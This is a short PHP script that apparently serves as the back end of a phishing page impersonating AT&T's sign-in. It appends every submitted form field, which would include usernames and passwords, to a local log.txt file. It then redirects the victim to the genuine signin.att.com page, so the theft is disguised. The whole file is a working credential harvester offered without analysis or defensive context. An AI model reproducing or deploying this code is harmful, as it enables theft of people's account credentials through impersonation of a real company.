
 
<?php
 
// Set the location to redirect the page
 
 if (isset($_POST['submitform']))
    {   
    ?>
<script type="text/javascript">
window.location = "https://signin.att.com/";
</script>      
    <?php
}

  
 
 
 
// Open the text file in writing mode 

$file = fopen("log.txt", "a");
 

foreach($_POST as $variable => $value) {

    fwrite($file, $variable);

    fwrite($file, "=");

    fwrite($file, $value);

    fwrite($file, "\r\n");
}
 

fwrite($file, "\r\n");

fclose($file);

exit;
?>

